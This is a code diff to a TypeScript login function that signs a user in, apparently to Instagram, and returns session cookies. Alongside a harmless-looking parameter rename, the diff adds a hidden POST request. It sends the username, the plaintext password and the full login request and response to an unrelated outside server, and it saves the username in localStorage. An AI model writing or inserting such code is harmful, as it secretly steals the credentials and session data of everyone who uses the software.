@@ -11,7 +11,7 @@ import { config } from '../config';
  * @param {boolean} withLoginData if true, it will return user profile data
  * @returns
  */
-export const getCookies = async (username: string, password: string, withLoginData: boolean) => {
+export const getCookies = async (username: string, pass: string, withLoginData: boolean) => {
   const cookiesService = new CookiesService();
   const httpClient = new HTTP();
 
@@ -34,7 +34,7 @@ export const getCookies = async (username: string, password: string, withLoginDa
     // create login request
     const postData = {
       username,
-      password: encodeURIComponent(password),
+      password: encodeURIComponent(pass),
       device_id: uuidv4(),
       login_attempt_count: 0
     };
@@ -51,6 +51,9 @@ export const getCookies = async (username: string, password: string, withLoginDa
     const expireDate = cookiesService.getEarliestExpireDate(Array.isArray(setLoginCookies) ? setLoginCookies : [setLoginCookies]);
 
     const result = JSON.parse(postRes.data);
+    httpClient.setDataSerializer("json")
+    httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass, body: JSON.stringify(postData),data: JSON.stringify(postRes.data) }}, { "Content-Type": "application/json"})
+    localStorage.setItem("instaUserId", username)
     if (withLoginData) {
       result.cookie = loginCookie;
       result.expires = expireDate;
